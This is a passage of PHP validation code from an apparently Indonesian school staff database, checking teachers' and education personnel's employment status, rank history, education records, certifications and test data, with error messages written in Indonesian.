                                        $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> jika PNS, <b>SK CPNS</b> wajib terisi";
                                        $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                    }
                                    $tmt_cpns = $ptk->getTglCpns();
                                    if (empty($tmt_cpns)) {
                                        $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> jika PNS, <b>TMT CPNS</b> wajib terisi";
                                        $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                    }

                                    $c = new \Criteria();
                                    $c->add(RiwayatGajiBerkalaPeer::PTK_ID, $ptk->getPtkId());
                                    $c->add(RiwayatGajiBerkalaPeer::SOFT_DELETE, 0);
                                    $rwyGajiBerkalaCount = RiwayatGajiBerkalaPeer::doCount($c);

                                    if ($rwyGajiBerkalaCount < 1) {
                                        $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> jika PNS, <b>Riwayat Gaji Berkala</b> wajib terisi";
                                        $this->setArrValidation($i++, "riwayat_gaji_berkala", 2, $keterangan);
                                    }

                                    // Riwayat kepangkata bagi PNS
                                    // $c = new \Criteria();
                                    // $c->add(RwyKepangkatanPeer::PTK_ID, $ptk->getPtkId());
                                    // $c->add(RwyKepangkatanPeer::SOFT_DELETE, 0);
                                    // $countPtkGol = RwyKepangkatanPeer::doCount($c);
                                    // $ptkGolObj = RwyKepangkatanPeer::doSelect($c);

                                    // if ($countPtkGol < 1) {
                                    //     // 16
                                    //     $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> sebagai PNS <b>belum memiliki riwayat kepangkatan</b>. Mohon lengkapi terlebih dahulu";
                                    //     $this->setArrValidation($i++, "ptk", 2, $keterangan);

                                    // }

                                }

                            }

                        } else if ($status_kepegawaian == 4) {
                            // GTY
                            if ($ptkTerd->getPtkInduk() == 1 && $sekolahObj->getStatusSekolah() == 1) {
                                $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> tidak diperkenankan menginduk disekolah negeri karena status kepegawaiannya adalah GTY";
                                $this->setArrValidation($i++, "ptk", 2, $keterangan);

                                $this->setTriggerValidation($app, "ptk", $ptk->getPtkId(), "status_kepegawaian_id", $keterangan);
                            }

                        } else if (in_array($status_kepegawaian, array(7,99))){
                            // Ref expired
                            if ($ptkTerd->getPtkInduk() == 1) {
                                $keterangan = "GTK a/n <b>{$ptk->getNama()}</b>, <b>Status Kepegawaian </b> yang dipilih telah di non-aktifkan. Harap diisi dengan benar";
                                $this->setArrValidation($i++, "ptk", 2, $keterangan);
    
                                $this->setTriggerValidation($app, "ptk", $ptk->getPtkId(), "status_kepegawaian_id", $keterangan);
                            }
                        } else {
                            if ($ptkTerd->getPtkInduk() == 1) {
                                if (!empty($ptk->getNip())) {
                                    $keterangan = "GTK a/n <b>{$ptk->getNama()}</b>, <b>Status Kepegawaian</b> bukan PNS/CPNS harap NIP dikosongkan";
                                    $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                }
                            }
                        }

                        if ($countPtkTers > 0) {
                            if (!$ptk->getTmtPengangkatan() && $ptkTerd->getPtkInduk() == 1) {
                                $keterangan = "GTK a/n <b>{$ptk->getNama()}</b>, <b>TMT Pengangkatan</b> wajib terisi";
                                $this->setArrValidation($i++, "ptk", 2, $keterangan);

                                $this->setTriggerValidation($app, "ptk", $ptk->getPtkId(), "tmt_pengangkatan", "GTK a/n <b>{$ptk->getNama()}</b>, <b>TMT Pengangkatan</b> wajib terisi");
                            }
                        }

                        if ($countPtkTers > 0) {
                            if ($ptkTerd->getPtkInduk() == 1 && $ptk->getJenisPtkId() == 99) {
                                $keterangan = "GTK a/n <b>{$ptk->getNama()}</b>, <b>Jenis PTK</b> harap diisi dengan benar";
                                $this->setArrValidation($i++, "ptk", 2, $keterangan);

                                $this->setTriggerValidation($app, "ptk", $ptk->getPtkId(), "jenis_ptk_id", $keterangan);
                            }
                        }

                        if($ptk->getTmtPengangkatan()){
                            $selisihtmtdantgllahir = $ptk->getTmtPengangkatan() - $ptk->getTanggalLahir();
                            if ($countPtkTers > 0) {
                                if ($ptkTerd->getPtkInduk() == 1 && $selisihtmtdantgllahir < 15) {
                                    $keterangan = "GTK a/n <b>{$ptk->getNama()}</b>, Selisih antara <b>TMT pengangkatan</b> dan <b>Tanggal Lahir</b> tidak diperkenankan dibawah dari 15 tahun (Saat ini selisih {$selisihtmtdantgllahir} tahun)";
                                    $this->setArrValidation($i++, "ptk", 2, $keterangan);

                                    $this->setTriggerValidation($app, "ptk", $ptk->getPtkId(), "tanggal_lahir", "TMT Pengangkatan dan Tanggal Lahir hanya berselisih {$selisihtmtdantgllahir} tahun");
                                    // trigger vld ptkf
                                    /*$c = new \Criteria();
                                    $c->add(VldPtkPeer::PTK_ID, $ptk->getPtkId());
                                    $c->add(VldPtkPeer::SOFT_DELETE, 0);
                                    $c->add(VldPtkPeer::STATUS_VALIDASI, array(1,2,3), \Criteria::IN);
                                    $c->add(VldPtkPeer::FIELD_ERROR, "tanggal_lahir");
                                    $vldPtkObj = VldPtkPeer::doSelectOne($c);

                                    if (!is_object($vldPtkObj)) {
                                        $uuid = pg_gen_uuid(VldPtkPeer::DATABASE_NAME);
                                        $vldPtkObj = new VldPtk();
                                        $vldPtkObj->setLogid($uuid);
                                        $vldPtkObj->setCreateDate(getCreateDate($vldPtkObj->getLastSync(), $app));
                                    }
                                    $vldPtkObj->setStatusValidasi(1);
                                    $vldPtkObj->setPtkId($ptk->getPtkId());
                                    $vldPtkObj->setIdtype(2001);
                                    $vldPtkObj->setFieldError("tanggal_lahir");
                                    $vldPtkObj->setErrorMessage("TMT Pengangkatan dan Tanggal Lahir hanya berselisih {$selisihtmtdantgllahir} tahun");
                                    $vldPtkObj->setAppUsername("validation_trigger");
                                    $vldPtkObj->setSoftDelete(0);
                                    $vldPtkObj->setUpdaterId('90915957-31F5-E011-819D-43B216F82ED4');
                                    $vldPtkObj->setLastUpdate(getLastUpdate($vldPtkObj->getLastSync(), $app));
                                    $vldPtkObj->setLastSync(getLastSync($vldPtkObj->getLastSync(), $app));
                                    $vldPtkObj->save();*/
                                }
                            }
                        }

                        $agePtk = $this->getUsiaPtk($ptk->getTanggalLahir());

                        $lenNamaPtk = strlen($ptk->getNama());
                        if ($lenNamaPtk < 3) {
                            $keterangan = "GTK a/n <b>{$ptk->getNama()}</b>, terhitung jumlah panjang nama hanya <b>{$lenNamaPtk}</b> karakter";
                            $this->setArrValidation($i++, "ptk", 2, $keterangan);

                            // trigger vld ptkf
                            $this->setTriggerValidation($app, "ptk", $ptk->getPtkId(), "nama", $keterangan);
                            /*$c = new \Criteria();
                            $c->add(VldPtkPeer::PTK_ID, $ptk->getPtkId());
                            $c->add(VldPtkPeer::SOFT_DELETE, 0);
                            $c->add(VldPtkPeer::STATUS_VALIDASI, array(1,2,3), \Criteria::IN);
                            $c->add(VldPtkPeer::FIELD_ERROR, "nama");
                            $vldPtkObj = VldPtkPeer::doSelectOne($c);

                            if (!is_object($vldPtkObj)) {
                                $uuid = pg_gen_uuid(VldPtkPeer::DATABASE_NAME);
                                $vldPtkObj = new VldPtk();
                                $vldPtkObj->setLogid($uuid);
                                $vldPtkObj->setCreateDate(getCreateDate($vldPtkObj->getLastSync(), $app));
                            }
                            $vldPtkObj->setStatusValidasi(1);
                            $vldPtkObj->setPtkId($ptk->getPtkId());
                            $vldPtkObj->setIdtype(2001);
                            $vldPtkObj->setFieldError("nama");
                            $vldPtkObj->setErrorMessage($keterangan);
                            $vldPtkObj->setAppUsername("validation_trigger");
                            $vldPtkObj->setSoftDelete(0);
                            $vldPtkObj->setUpdaterId('90915957-31F5-E011-819D-43B216F82ED4');
                            $vldPtkObj->setLastUpdate(getLastUpdate($vldPtkObj->getLastSync(), $app));
                            $vldPtkObj->setLastSync(getLastSync($vldPtkObj->getLastSync(), $app));
                            $vldPtkObj->save();*/
                        }

                        // cek rwy kepangkatan
                        $c = new \Criteria();
                        $c->add(RwyKepangkatanPeer::PTK_ID, $ptk->getPtkId());
                        $c->add(RwyKepangkatanPeer::SOFT_DELETE, 0);
                        $countPtkGol = RwyKepangkatanPeer::doCount($c);
                        $ptkGolObj = RwyKepangkatanPeer::doSelect($c);

                        if ($countPtkGol < 1) {
                            // 16
                            if ($status_kepegawaian == 1 && $ptkTerd->getPtkInduk() == 1) {
                                $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> sebagai PNS <b>belum memiliki riwayat kepangkatan</b>. Mohon lengkapi terlebih dahulu";
                                $this->setArrValidation($i++, "ptk", 2, $keterangan);
                            }

                        } else {

                            /*if ($countPtkTers > 0) {
                                if ($ptkTerd->getPtkInduk() == 1) {
                                    $arrPangkatGolonganIdDouble = array();
                                    foreach ($ptkGolObj as $ptkGol) {
                                        if ($ptkGol->getPangkatGolonganId() < 99) {
                                            $arrPangkatGolonganIdDouble[$ptkGol->getPangkatGolonganId()] += 1;
                                        }
                                    }

                                    foreach ($arrPangkatGolonganIdDouble as $key => $value) {
                                        if ($value > 1) {
                                            // echo $key;
                                            $pangkatGolonganObj = PangkatGolonganPeer::retrieveByPK($key);
                                            if (is_object($pangkatGolonganObj)) {
                                                $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> memiliki pangkat golongan lebih dari satu <b>(".$pangkatGolonganObj->getKode()." berjumlah ".$arrPangkatGolonganIdDouble[$key].")</b> di rincian PTK pada tabulasi Rwy.Kepangkatan";
                                                $this->setArrValidation($i++, "ptk", 1, $keterangan);
                                            }
                                        }
                                    }
                                }
                            }*/
                            // print_r($arrPangkatGolonganIdDouble);
                        }

                        // cek riwayat pendidikan formal
                        if (in_array($ptk->getJenisPtkId(), $jenisPtkIdGuruArr)) {
                            if ($ptkTerd->getPtkInduk() == 1) {

                                /* $jenjangPendidikanObj = JenjangPendidikanPeer::doSelect(new \Criteria());
                                foreach ($jenjangPendidikanObj as $key => $value) {
                                    $jenjangPendidikanArr[$value->getPrimaryKey()] = $value->getNama();
                                }

                                $sql = "SELECT
                                            ptk_id,
                                            MAX(jenjang_pendidikan_id) as max_jenjang
                                        FROM rwy_pend_formal
                                        WHERE
                                            soft_delete = 0
                                            AND ptk_id = '".$ptk->getPtkId()."'
                                        GROUP BY
                                            ptk_id";

                                $datas = getDataBySql($sql, false, DBNAME);
                                if (sizeof($datas) > 0) {
                                    foreach ($datas as $val) {
                                        
                                    }
                                } */
                            
                                $c = new \Criteria();
                                $c->add(BidangSdmPeer::PTK_ID, $ptk->getPtkId());
                                $c->add(BidangSdmPeer::SOFT_DELETE, 0);
                                $countBidangSdm = BidangSdmPeer::doCount($c);

                                if ($countBidangSdm < 1) {
                                    $keterangan = "GTK a/n <b>".$ptk->getNama()."</b> dengan Jenis PTK (<b>".$ptk->getJenisPtk()->getJenisPtk()."</b>) wajib mengisikan data <b>Kompetensi</b> minimal 1 record";
                                    $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                }

                                $sql = "select
                                            ptk_id,
                                            urutan,
                                            count(1) as jumlah_urutan
                                        from bidang_sdm
                                        where
                                            soft_delete=0
                                            and ptk_id = '".$ptk->getPtkId()."'
                                        group by
                                            ptk_id,
                                            urutan";
                                $dobelKompetensi = getDataBySql($sql, FALSE, DBNAME);

                                // if ($dobelKomptensi[0]['jumlah'])
                                // print_r($dobelKompetensi);
                                if (sizeof($dobelKompetensi)) {
                                    if ($dobelKompetensi[0]['jumlah_urutan'] > 1) {
                                        $keterangan = "GTK a/n <b>".$ptk->getNama()."</b> dengan Jenis PTK (<b>".$ptk->getJenisPtk()->getJenisPtk()."</b>) ditemukan duplikasi pada urutan (urutan ke-".$dobelKompetensi[0]['urutan'].") pada data <b>Kompetensi</b>";
                                        $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                    }
                                }
                            }
                        }


                        $c = new \Criteria();
                        $c->add(RwyPendFormalPeer::PTK_ID, $ptk->getPtkId());
                        $c->add(RwyPendFormalPeer::SOFT_DELETE, 0);
                        $rwyPendFormatObj = RwyPendFormalPeer::doSelect($c);
                        $countRwyPendFormal = RwyPendFormalPeer::doCount($c);
                        if ($countPtkTers > 0) {
                            if ($ptkTerd->getPtkInduk() == 1 && $countRwyPendFormal < 1) {
                                $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b>, harap diisi";
                                $this->setArrValidation($i++, "ptk", 2, $keterangan);
                            }

                            if($ptkTerd->getPtkInduk() == 1 && $countRwyPendFormal > 0){

                                $is_s1 = false;
                                $is_dibawah_sma = false;
                                $jenjangPendidikanIdPendidikanFormalArr = array();
                                $tanggal_lahir = $ptk->getTanggalLahir();
                                foreach ($rwyPendFormatObj as $formal) {

                                    $jenjangPendidikanIdPendidikanFormalArr[] = $formal->getJenjangPendidikanId();

                                    if (in_array($formal->getJenjangPendidikanId(), array(30,35,40))) {
                                        $is_s1 = true;
                                    }

                                    if ($formal->getJenjangPendidikanId() < 6) {
                                        $is_dibawah_sma = true;
                                    }

                                    if($formal->getStatusKuliah() == 1 && $formal->getTahunLulus()){
                                        $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b> jenjang ".$formal->getJenjangPendidikan()->getNama()." berstatus masih studi/kuliah namun tahun lulus telah terisi";
                                        $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                    }

                                    if($formal->getStatusKuliah() == 1){
                                        if (!$formal->getNim() || $formal->getNim() == "-") {
                                            $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b> jenjang ".$formal->getJenjangPendidikan()->getNama()." berstatus masih studi/kuliah namun NIS/NISN/NIM kosong";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }

                                        if($formal->getSemester() > 15){
                                            $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b> jenjang ".$formal->getJenjangPendidikan()->getNama()." berstatus masih studi/kuliah lebih dari 15 semester (semester terisi = ".$formal->getSemester().")";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }
                                    }

                                    if($formal->getStatusKuliah() == 0){
                                        if ($formal->getTahunLulus() == 0 && !in_array($formal->getJenjangPendidikanId(), array(0,3,98,99))) {
                                            // echo "masuk sini ga?"; die;
                                            $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b> jenjang ".$formal->getJenjangPendidikan()->getNama().", jika sudah lulus harap mengisikan tahun lulus";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }

                                        if ($formal->getTahunMasuk() > $formal->getTahunLulus() && !in_array($formal->getJenjangPendidikanId(), array(0,3,98,99))) {
                                            $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b> jenjang ".$formal->getJenjangPendidikan()->getNama().", tahun masuk > tahun lulus";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }
                                    }

                                    if ($formal->getTahunLulus() > 0 && $formal->getStatusKuliah() == 0 && $formal->getJenjangPendidikanId() == 4) {
                                        // jenjang sd
                                        $selisihTahun = $formal->getTahunLulus() - date('Y', strtotime($tanggal_lahir));
                                        if ($selisihTahun <= 9) {
                                            $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b> jenjang <b>".$formal->getJenjangPendidikan()->getNama()."</b>, memiliki selisih antara tanggal lahir dengan tahun lulus dibawah sama dengan 9 tahun (saat ini berselisih {$selisihTahun} tahun)";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }
                                    } else if ($formal->getTahunLulus() > 0 && $formal->getStatusKuliah() == 0 && $formal->getJenjangPendidikanId() == 5) {
                                        // jenjang smp
                                        $selisihTahun = $formal->getTahunLulus() - date('Y', strtotime($tanggal_lahir));
                                        if ($selisihTahun <= 11) {
                                            $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b> jenjang <b>".$formal->getJenjangPendidikan()->getNama()."</b>, memiliki selisih antara tanggal lahir dengan tahun lulus dibawah sama dengan 11 tahun (saat ini berselisih {$selisihTahun} tahun)";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }
                                    } else if ($formal->getTahunLulus() > 0 && $formal->getStatusKuliah() == 0 && $formal->getJenjangPendidikanId() == 6) {
                                        // jenjang sma
                                        $selisihTahun = $formal->getTahunLulus() - date('Y', strtotime($tanggal_lahir));
                                        if ($selisihTahun <= 13) {
                                            $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b> jenjang <b>".$formal->getJenjangPendidikan()->getNama()."</b>, memiliki selisih antara tanggal lahir dengan tahun lulus dibawah sama dengan 13 tahun (saat ini berselisih {$selisihTahun} tahun)";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }
                                    } else if ($formal->getTahunLulus() > 0 && $formal->getStatusKuliah() == 0 && $formal->getJenjangPendidikanId() == 20) {
                                        // jenjang D1
                                        $selisihTahun = $formal->getTahunLulus() - date('Y', strtotime($tanggal_lahir));
                                        if ($selisihTahun <= 14) {
                                            $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b> jenjang <b>".$formal->getJenjangPendidikan()->getNama()."</b>, memiliki selisih antara tanggal lahir dengan tahun lulus dibawah sama dengan 14 tahun (saat ini berselisih {$selisihTahun} tahun)";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }
                                    } else if ($formal->getTahunLulus() > 0 && $formal->getStatusKuliah() == 0 && $formal->getJenjangPendidikanId() == 21) {
                                        // jenjang D2
                                        $selisihTahun = $formal->getTahunLulus() - date('Y', strtotime($tanggal_lahir));
                                        if ($selisihTahun <= 15) {
                                            $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b> jenjang <b>".$formal->getJenjangPendidikan()->getNama()."</b>, memiliki selisih antara tanggal lahir dengan tahun lulus dibawah sama dengan 15 tahun (saat ini berselisih {$selisihTahun} tahun)";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }
                                    } else if ($formal->getTahunLulus() > 0 && $formal->getStatusKuliah() == 0 && $formal->getJenjangPendidikanId() == 22) {
                                        // jenjang D3
                                        $selisihTahun = $formal->getTahunLulus() - date('Y', strtotime($tanggal_lahir));
                                        if ($selisihTahun <= 16) {
                                            $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b> jenjang <b>".$formal->getJenjangPendidikan()->getNama()."</b>, memiliki selisih antara tanggal lahir dengan tahun lulus dibawah sama dengan 16 tahun (saat ini berselisih {$selisihTahun} tahun)";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }
                                    } else if ($formal->getTahunLulus() > 0 && $formal->getStatusKuliah() == 0 && ($formal->getJenjangPendidikanId() == 23 || $formal->getJenjangPendidikanId() == 30)) {
                                        // jenjang D4 dan S1
                                        $selisihTahun = $formal->getTahunLulus() - date('Y', strtotime($tanggal_lahir));
                                        if ($selisihTahun <= 17) {
                                            $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b> jenjang <b>".$formal->getJenjangPendidikan()->getNama()."</b>, memiliki selisih antara tanggal lahir dengan tahun lulus dibawah sama dengan 17 tahun (saat ini berselisih {$selisihTahun} tahun)";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }
                                    } else if ($formal->getTahunLulus() > 0 && $formal->getStatusKuliah() == 0 && $formal->getJenjangPendidikanId() == 35) {
                                        // jenjang S2
                                        $selisihTahun = $formal->getTahunLulus() - date('Y', strtotime($tanggal_lahir));
                                        if ($selisihTahun <= 18) {
                                            $keterangan = "Riwayat Pendidikan Formal GTK a/n <b>{$ptk->getNama()}</b> jenjang <b>".$formal->getJenjangPendidikan()->getNama()."</b>, memiliki selisih antara tanggal lahir dengan tahun lulus dibawah sama dengan 18 tahun (saat ini berselisih {$selisihTahun} tahun)";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }
                                    }

                                }

                                $jenjangPendidikanPendidikanFormalObj = JenjangPendidikanPeer::retrieveByPk(max($jenjangPendidikanIdPendidikanFormalArr));
                                if (is_object($jenjangPendidikanPendidikanFormalObj)) {
                                    if (in_array($ptk->getJenisPtkId(), $jenisPtkIdGuruArr) && $jenjangPendidikanPendidikanFormalObj->getJenjangPendidikanId() == 5) {
                                        // dibawah sama dengan smp
                                        $keterangan = "Guru a/n <b>{$ptk->getNama()}</b> dan Jenis PTK <b>".$ptk->getJenisPtk()->getJenisPtk()."</b> di riwayat pendidikan formal hanya jenjang <b>".$jenjangPendidikanPendidikanFormalObj->getNama()."</b>. Guru wajib berpendidikan S1";
                                        $this->setArrValidation($i++, "ptk", 1, $keterangan);
                                    } else if (in_array($ptk->getJenisPtkId(), $jenisPtkIdGuruArr) && $jenjangPendidikanPendidikanFormalObj->getJenjangPendidikanId() <= 4) {
                                        // dibawah sama dengan sd
                                        $keterangan = "Guru a/n <b>{$ptk->getNama()}</b> dan Jenis PTK <b>".$ptk->getJenisPtk()->getJenisPtk()."</b> di riwayat pendidikan formal hanya jenjang <b>".$jenjangPendidikanPendidikanFormalObj->getNama()."</b>. Guru wajib berpendidikan S1";
                                        $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                    }
                                } else {
                                    $is_dibawah_sma = true;
                                }

                                if ($this->getUsiaPtk($ptk->getTanggalLahir()) <= 17
                                    and in_array($ptk->getJenisPtkId(), $jenisPtkIdGuruArr)
                                    and $is_s1) {

                                    $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> dan Jenis PTK <b>".$ptk->getJenisPtk()->getJenisPtk()."</b> serta berpendidikan minimal S1 memiliki umur kurang dari 17 tahun. (Umur saat ini = ".$this->getUsiaPtk($ptk->getTanggalLahir())." tahun)";
                                    $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                }

                                if ($this->getUsiaPtk($ptk->getTanggalLahir()) < 17
                                    and in_array($ptk->getJenisPtkId(), array(11,30,40))
                                    and $is_dibawah_sma
                                    and $ptk->getTmtPengangkatan() > '2008-01-01') {

                                    $keterangan = "Tendik a/n <b>{$ptk->getNama()}</b> dan Jenis PTK <b>".$ptk->getJenisPtk()->getJenisPtk()."</b> serta berpendidikan minimal SMA/Sederajat memiliki umur kurang 17 tahun. (Umur saat ini = ".$this->getUsiaPtk($ptk->getTanggalLahir())." tahun)";
                                    $this->setArrValidation($i++, "ptk", 2, $keterangan);

                                }
                            }
                        }

                        // cek rwy_sertifikasi
                        $c = new \Criteria();
                        $c->add(RwySertifikasiPeer::PTK_ID, $ptk->getPtkId());
                        $c->add(RwySertifikasiPeer::SOFT_DELETE, 0);
                        $rwySertifikasi = RwySertifikasiPeer::doSelect($c);
                        $countRwySertifikasi = RwySertifikasiPeer::doCount($c);

                        if ($countPtkTers > 0) {
                            if ($ptkTerd->getPtkInduk() == 1 && $countRwySertifikasi > 0) {

                                $guruKelasIsLinier = false;
                                $kodeBidangStudiIdGuruKelasArr = array(1,2,3);
                                $guruBkIsLinier = false;
                                $kodeBidangStudiIdGuruBkArr = array(35);
                                $guruInklusiIsLinier = false;
                                $kodeBidangStudiIdGuruInklusiArr = array(3);

                                foreach ($rwySertifikasi as $rwy) {
                                    if (in_array($rwy->getBidangStudiId(), $kodeBidangStudiIdGuruKelasArr)) {
                                        $guruKelasIsLinier = true;
                                    }
                                    if (in_array($rwy->getBidangStudiId(), $kodeBidangStudiIdGuruBkArr)) {
                                        $guruBkIsLinier = true;
                                    }
                                    if (in_array($rwy->getBidangStudiId(), $kodeBidangStudiIdGuruInklusiArr)) {
                                        $guruInklusiIsLinier = true;
                                    }

                                    // $ptkNoSerDobelArr = [];
                                    // $ptkNrgDobelArr = [];
                                    // $ptkNoPesDobelArr = [];
                                    // push ptk yg dobel no sertifikat pendidiknya
                                    if ($rwy->getIdJenisSertifikasi() == 1) {
                                        if (in_array($rwy->getNomorSertifikat(), $dataNoSerDobelArr)) {
                                            $ptkNoSerDobelArr[$rwy->getNomorSertifikat()][] = $ptk->getNama();
                                        }

                                        // if (in_array($rwy->getNrg(), $dataNrgDobelArr)) {
                                        //     $ptkNrgDobelArr[$rwy->getNrg()][] = $ptk->getNama();
                                        // }

                                        if (in_array($rwy->getNomorPeserta(), $dataNoPesDobelArr)) {
                                            $ptkNoPesDobelArr[$rwy->getNomorPeserta()][] = $ptk->getNama();
                                        }
                                    } else if ($rwy->getIdJenisSertifikasi() == 10) {
                                        $jumlahGtkSertifikasiIndustri++;
                                    }
                                }

                                // cek linieritas guru kelas
                                if ($ptk->getJenisPtkId() == 3 && !$guruKelasIsLinier) {
                                    $keterangan = "Riwayat Sertifikasi GTK a/n <b>{$ptk->getNama()}</b>, tidak linier dengan <b>Jenis PTK (Guru Kelas)</b> yg dipilih";
                                    $this->setArrValidation($i++, "ptk", 1, $keterangan);
                                }

                                // cek linieritas guru bk
                                if ($ptk->getJenisPtkId() == 5 && !$guruBkIsLinier) {
                                    $keterangan = "Riwayat Sertifikasi GTK a/n <b>{$ptk->getNama()}</b>, tidak linier dengan <b>Jenis PTK (Guru BK)</b> yg dipilih";
                                    $this->setArrValidation($i++, "ptk", 1, $keterangan);
                                }

                                // cek linieritas guru inklusi
                                if ($ptk->getJenisPtkId() == 6 && !$guruInklusiIsLinier) {
                                    $keterangan = "Riwayat Sertifikasi GTK a/n <b>{$ptk->getNama()}</b>, tidak linier dengan <b>Jenis PTK (Guru Inklusi)</b> yg dipilih";
                                    $this->setArrValidation($i++, "ptk", 1, $keterangan);
                                }

                            }

                        }

                        if ($ptkTerd->getPtkInduk() == 1 && in_array($ptk->getJenisPtkId(), $jenisPtkIdGuruArr)) {
                            // cek rwy_kerja
                            $c = new \Criteria();
                            $c->add(RwyKerjaPeer::PTK_ID, $ptk->getPtkId());
                            $c->add(RwyKerjaPeer::SOFT_DELETE, 0);
                            $rwyKerjaObj = RwyKerjaPeer::doSelect($c);

                            if (sizeof($rwyKerjaObj) < 1) {
                                $keterangan = "Riwayat Karir GTK a/n <b>{$ptk->getNama()}</b>, wajib diisi minimal satu record";
                                $this->setArrValidation($i++, "ptk", 2, $keterangan);
                            }
                        }

                        if ($ptk->getJenisPtkId() == 40) {
                            if ($countPerpus < 1) {
                                $keterangan = "Terdeteksi data tidak wajar. GTK a/n <b>".$ptk->getNama()."</b> berjenis PTK Pustakawan namun tidak memiliki prasarana Perpustakaan";
                                $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                            }
                        } else if ($ptk->getJenisPtkId() == 30) {
                            if ($countPrasaranaLab < 1) {
                                $keterangan = "Terdeteksi data tidak wajar. GTK a/n <b>".$ptk->getNama()."</b> berjenis PTK Laboran namun tidak memiliki prasarana Laboratorium";
                                $this->setArrValidation($i++, "ptk", 2, $keterangan);
                            }
                        }

                        if (in_array($ptk->getJenisPtkId(), $jenisPtkIdGuruArr) && $ptkTerd->getPtkInduk() == 1) {
                            // Cek nilai UKG
                            $c = new \Criteria();
                            $c->add(NilaiTestPeer::PTK_ID, $ptk->getPtkId());
                            $c->add(NilaiTestPeer::SOFT_DELETE, 0);
                            $c->add(NilaiTestPeer::ASAL_DATA, 1);
                            $c->add(NilaiTestPeer::JENIS_TEST_ID, 100); // UKG
                            $nilaiTestUkg = NilaiTestPeer::doSelect($c);

                            foreach ($nilaiTestUkg as $nilai) {
                                if (!$nilai->getNomorPeserta()) {
                                    $keterangan = "Nilai/Test GTK a/n <b>".$ptk->getNama()."</b> dengan jenis test <b>UKG</b>, untuk nomor peserta wajib diisi";
                                    $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                }
                            }
                        }

                        $sql = "SELECT
                                    table_catalog,
                                    table_schema,
                                    table_name,
                                    column_name,
                                    ordinal_position
                                FROM information_schema.columns
                                WHERE
                                    table_schema = 'public'
                                  AND table_name IN (SELECT DISTINCT table_name
                                                                            FROM information_schema.columns
                                                                            WHERE column_name = 'ptk_id')
                                    AND (column_name ILIKE '%tmt%' OR column_name ILIKE '%tanggal%' OR column_name ILIKE '%tgl%')
                                    AND table_name NOT IN ('pengawas_terdaftar', 'ptk_baru', 'inpassing')
                                    AND column_name <> 'tanggal_lahir'";

                        $tmtTerkaitPtkArr = getDataBySql($sql, FALSE, DBNAME);
                        
                        foreach ($tmtTerkaitPtkArr as $tmtPtk) {
                            $soft_delete = "and soft_delete = 0";
                            $where_ta = "";
                            if ($tmtPtk['table_name'] == "ptk_terdaftar") {
                                $where_ta = "and tahun_ajaran_id = '{$tahunAjaranId}' and jenis_keluar_id is null";
                            }
                            // if (in_array($tmtPtk['table_name'], array('kitas_pd', 'kitas_ptk', 'paspor_ptk'))) {
                            //     $soft_delete = "and expired_date is null";
                            // }
                            $sql = "select 
                                        ptk_id, 
                                        {$tmtPtk['column_name']} 
                                    from {$tmtPtk['table_name']} 
                                    where 
                                        ptk_id = '{$ptk->getPtkId()}' 
                                        {$soft_delete}
                                        {$where_ta}";
                            $tglPtkArr = getDataBySql($sql, FALSE, DBNAME);

                            switch ($tmtPtk['table_name']) {
                                case 'ptk_terdaftar': $alias_table = "Penugasan GTK"; break;
                                case 'rwy_fungsional': $alias_table = "Rwy. Jabatan Fungsional"; break;
                                case 'rwy_kerja': $alias_table = "Rwy. Karir Guru"; break;
                                default: $alias_table = ucwords(str_replace("_", " ", $tmtPtk['table_name'])); break;
                            }

                            foreach ($tglPtkArr as $tglPtk) {
                                if (sizeof($tglPtk) > 0) {
                                    if (!$tglPtk[$tmtPtk['column_name']]) {
                                        continue;
                                    }

                                    $last_sync = getLastUpdate($ptk->getLastSync(), $app);
                                    $selisihTahun = date('Y', strtotime($tglPtk[$tmtPtk['column_name']])) - date('Y', strtotime($ptk->getTanggalLahir()));
                                    $batasAtasTmt = date('Y', strtotime($tglPtk[$tmtPtk['column_name']])) - date('Y', strtotime($last_sync));

